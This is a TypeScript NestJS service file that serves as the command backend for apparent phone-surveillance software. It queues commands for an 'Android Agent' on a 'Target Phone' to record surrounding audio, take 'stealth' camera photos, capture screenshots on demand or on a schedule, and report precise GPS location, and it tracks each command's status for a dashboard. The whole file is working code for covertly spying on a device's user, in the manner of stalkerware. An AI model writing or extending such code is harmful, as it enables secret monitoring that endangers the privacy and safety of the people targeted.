import { Injectable, Optional } from '@nestjs/common';
import { PolicyService } from '../policy/policy.service';

export interface SurroundAudioCommandDto {
  deviceId: string;
  durationSec: number; // 60, 120, 300 seconds
}

export interface StealthPhotoCommandDto {
  deviceId: string;
  camera: 'FRONT' | 'REAR';
}

export interface ScreenshotCommandDto {
  deviceId: string;
}

export interface SyncLocationCommandDto {
  deviceId: string;
}

@Injectable()
export class CommandsService {
  private activeCommandQueue = new Map<string, any[]>();
  private commandStatusStore = new Map<string, { deviceId: string; status: 'PENDING' | 'SUCCESS' | 'FAILED'; error?: string; timestamp: number; camera?: 'FRONT' | 'REAR'; action?: string }>();
  private screenshotScheduleStore = new Map<string, { active: boolean; durationMin: number; intervalSec: number; startTime: number; stopTime: number }>();

  constructor(@Optional() private readonly policyService?: PolicyService) {}

  // 1. Live Surround Audio Stream Trigger
  async triggerSurroundAudio(dto: SurroundAudioCommandDto) {
    const commandId = `cmd_audio_${Date.now().toString(36)}`;
    const payload = {
      commandId,
      action: 'RECORD_SURROUND_AUDIO',
      durationSec: dto.durationSec || 60,
      timestamp: new Date()
    };

    this.queueCommand(dto.deviceId, payload);
    if (this.policyService) {
      this.policyService.emitMediaEvent(dto.deviceId, payload);
    }
    console.log(`[Command Engine] Device ${dto.deviceId}: Triggered Live Surround Audio (${dto.durationSec}s)`);
    return { success: true, commandId, message: 'Surround audio command dispatched to device' };
  }

  // 2. Stealth Camera Photo Capture Trigger
  async triggerStealthPhoto(dto: StealthPhotoCommandDto) {
    const commandId = `cmd_photo_${Date.now().toString(36)}`;
    const payload = {
      commandId,
      action: 'CAPTURE_STEALTH_PHOTO',
      camera: dto.camera || 'FRONT',
      timestamp: new Date()
    };

    this.commandStatusStore.set(commandId, {
      deviceId: dto.deviceId,
      action: 'CAPTURE_STEALTH_PHOTO',
      camera: dto.camera || 'FRONT',
      status: 'PENDING',
      timestamp: Date.now()
    });

    this.queueCommand(dto.deviceId, payload);
    if (this.policyService) {
      this.policyService.emitMediaEvent(dto.deviceId, payload);
    }
    console.log(`[Command Engine] Device ${dto.deviceId}: Triggered Stealth Photo (${dto.camera} camera, commandId=${commandId})`);
    return { success: true, commandId, message: 'Stealth photo capture command dispatched' };
  }

  // 3. Instant Screen Capture Trigger
  async triggerScreenshot(dto: ScreenshotCommandDto) {
    const commandId = `cmd_scr_${Date.now().toString(36)}`;
    const payload = {
      commandId,
      action: 'CAPTURE_SCREENSHOT',
      timestamp: new Date()
    };

    this.commandStatusStore.set(commandId, {
      deviceId: dto.deviceId,
      action: 'CAPTURE_SCREENSHOT',
      status: 'PENDING',
      timestamp: Date.now()
    });

    this.queueCommand(dto.deviceId, payload);
    if (this.policyService) {
      this.policyService.emitMediaEvent(dto.deviceId, payload);
    }
    console.log(`[Command Engine] Device ${dto.deviceId}: Triggered Instant Screenshot`);
    return { success: true, commandId, message: 'Screenshot command dispatched' };
  }

  // 4. Configure & Schedule Automatic Screenshots
  async setScreenshotSchedule(dto: { deviceId: string; active: boolean; durationMin?: number; intervalSec?: number; startDelayMin?: number; startTime?: number }) {
    const now = Date.now();
    const durationMin = dto.durationMin || 15;
    const intervalSec = dto.intervalSec || 30;
    const startDelayMin = dto.startDelayMin || 0;

    const startTime = dto.startTime || (startDelayMin > 0 ? now + (startDelayMin * 60 * 1000) : now);
    const stopTime = startTime + (durationMin * 60 * 1000);

    const schedule = {
      active: dto.active,
      durationMin,
      intervalSec,
      startDelayMin,
      startTime: dto.active ? startTime : 0,
      stopTime: dto.active ? stopTime : 0
    };

    this.screenshotScheduleStore.set(dto.deviceId, schedule);

    const payload = {
      action: 'CONFIGURE_SCREENSHOT_SCHEDULE',
      active: dto.active,
      durationMin,
      intervalSec,
      startTime,
      stopTime,
      timestamp: new Date()
    };

    this.queueCommand(dto.deviceId, payload);
    if (this.policyService) {
      this.policyService.emitMediaEvent(dto.deviceId, payload);
    }

    const startNotice = startDelayMin > 0 
      ? `Scheduled to start in ${startDelayMin}m (${new Date(startTime).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })})` 
      : 'Starting immediately';

    console.log(`[Command Engine] Device ${dto.deviceId}: ${dto.active ? 'Activated' : 'Stopped'} Screenshot Schedule (${startNotice}, ${intervalSec}s interval for ${durationMin}m)`);
    return { 
      success: true, 
      schedule, 
      message: dto.active 
        ? `Screenshots scheduled! ${startNotice}, capturing every ${intervalSec}s for ${durationMin} minutes.` 
        : 'Screenshot schedule stopped' 
    };
  }

  getScreenshotSchedule(deviceId: string) {
    const schedule = this.screenshotScheduleStore.get(deviceId) || { active: false, durationMin: 15, intervalSec: 30, startTime: 0, stopTime: 0, startDelayMin: 0 };
    if (schedule.active && Date.now() > schedule.stopTime) {
      schedule.active = false;
    }
    return { success: true, schedule };
  }

  // 4. Instant GPS Triangulation Trigger
  async triggerLocationSync(dto: SyncLocationCommandDto) {
    const commandId = `cmd_loc_${Date.now().toString(36)}`;
    const payload = {
      commandId,
      action: 'SYNC_FINE_LOCATION',
      timestamp: new Date()
    };

    this.queueCommand(dto.deviceId, payload);
    if (this.policyService) {
      this.policyService.emitMediaEvent(dto.deviceId, payload);
    }
    console.log(`[Command Engine] Device ${dto.deviceId}: Triggered High-Accuracy Location Sync`);
    return { success: true, commandId, message: 'Location sync command dispatched' };
  }

  // Update Status Endpoint for Android Agent
  async updateCommandStatus(dto: { deviceId: string; commandId: string; status: 'PENDING' | 'SUCCESS' | 'FAILED'; error?: string }) {
    if (dto.commandId) {
      const existing = this.commandStatusStore.get(dto.commandId);
      this.commandStatusStore.set(dto.commandId, {
        deviceId: dto.deviceId,
        action: existing?.action,
        camera: existing?.camera,
        status: dto.status,
        error: dto.error,
        timestamp: existing?.timestamp || Date.now()
      });
      console.log(`[Command Engine] Command ${dto.commandId} status updated: ${dto.status}${dto.error ? ` (${dto.error})` : ''}`);
    }
    return { success: true };
  }

  // Fetch Command Statuses for Dashboard
  async getCommandStatuses(deviceId: string) {
    const statuses: Record<string, { status: string; error?: string; timestamp: number; camera?: 'FRONT' | 'REAR'; action?: string }> = {};
    this.commandStatusStore.forEach((val, key) => {
      if (val.deviceId === deviceId) {
        statuses[key] = { status: val.status, error: val.error, timestamp: val.timestamp, camera: val.camera, action: val.action };
      }
    });
    return { success: true, statuses };
  }

  // Helper: Enqueue Command for Target Phone MQTT / Socket Delivery
  private queueCommand(deviceId: string, commandPayload: any) {
    const queue = this.activeCommandQueue.get(deviceId) || [];
    queue.push(commandPayload);
    this.activeCommandQueue.set(deviceId, queue);
  }

  // Endpoint for Android Agent to fetch pending commands on check-in
  async getPendingCommands(deviceId: string) {
    const queue = this.activeCommandQueue.get(deviceId) || [];
    this.activeCommandQueue.set(deviceId, []); // Clear queue on retrieval
    return { count: queue.length, commands: queue };
  }
}
